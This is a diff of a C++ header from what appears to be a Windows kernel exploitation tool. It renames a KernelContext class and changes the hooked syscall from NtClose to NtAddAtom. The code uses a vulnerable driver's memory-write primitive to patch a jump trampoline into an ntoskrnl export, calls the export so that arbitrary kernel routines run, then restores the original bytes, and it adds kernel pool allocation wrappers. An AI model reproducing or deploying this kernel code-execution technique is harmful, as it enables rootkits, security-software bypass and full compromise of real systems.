@@ -1,25 +1,32 @@
 ﻿#pragma once
 
-#ifndef KERNEL_CONTEXT_HPP
-#define KERNEL_CONTEXT_HPP
+#ifndef K32_CONTEXT_HPP
+#define K32_CONTEXT_HPP
 
 #include <ntdll.hpp>
 #include <print>
 #include <string_view>
 #include <vuln/drivers/basic_vuln_driver.hpp>
 
-class KernelContext {
+class K32Context {
 public:
-    explicit KernelContext(BasicVulnDriver* driver);
+    explicit K32Context(BasicVulnDriver* driver);
 
 public:
+    BasicVulnDriver* GetDriver();
+
+public:
+    uintptr_t AllocatePool(POOL_TYPE poolType, std::size_t size);
+    bool FreePool(uintptr_t address);
+
+private:
     template <typename T, typename... A>
-    bool DetourHookK32Proc(T* outResult, uintptr_t functionAddress, const A... args);
+    bool InvokeK32Routine(T* outResult, uintptr_t functionAddress, const A... args);
 
     template <typename... A>
-    inline bool DetourHookK32Proc(uintptr_t functionAddress, const A... args);
+    inline bool InvokeK32Routine(uintptr_t functionAddress, const A... args);
 
-public:
+private:
     uintptr_t GetK32ModuleAddr(std::string_view moduleName);
     uintptr_t GetK32ExportProcAddr(std::string_view moduleName, std::string_view functionName);
 
@@ -27,15 +34,15 @@ private:
     BasicVulnDriver* driver;
 };
 
-#endif // !KERNEL_CONTEXT_HPP
+#endif // !K32_CONTEXT_HPP
 
 template <typename T, typename... A>
-inline bool KernelContext::DetourHookK32Proc(T* outResult, uintptr_t functionAddress, const A... args)
+inline bool K32Context::InvokeK32Routine(T* outResult, uintptr_t functionAddress, const A... args)
 {
     static uint8_t jmp[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
     *reinterpret_cast<uintptr_t*>(&jmp[2]) = functionAddress;
 
-    static const auto exNtCloseAddr = GetK32ExportProcAddr("ntoskrnl.exe", "NtClose");
+    static const auto exNtCloseAddr = GetK32ExportProcAddr("ntoskrnl.exe", "NtAddAtom");
     if (!exNtCloseAddr) {
         std::println("[-] Failed to get address of export function");
         return false;
@@ -55,16 +62,16 @@ inline bool KernelContext::DetourHookK32Proc(T* outResult, uintptr_t functionAdd
     using FN = T(__stdcall*)(A...);
 
     if constexpr (std::same_as<T, void>) {
-        reinterpret_cast<FN>(&NtClose)(args...);
+        reinterpret_cast<FN>(&NtAddAtom)(args...);
     } else {
-        *outResult = reinterpret_cast<FN>(&NtClose)(args...);
+        *outResult = reinterpret_cast<FN>(&NtAddAtom)(args...);
     }
 
     return driver->WriteMappedMemory(exNtCloseAddr, origin, sizeof(jmp));
 }
 
 template <typename... A>
-inline bool KernelContext::DetourHookK32Proc(uintptr_t functionAddress, const A... args)
+inline bool K32Context::InvokeK32Routine(uintptr_t functionAddress, const A... args)
 {
-    return DetourHookK32Proc<void>(static_cast<void*>(nullptr), functionAddress, args...);
+    return InvokeK32Routine<void>(static_cast<void*>(nullptr), functionAddress, args...);
 }
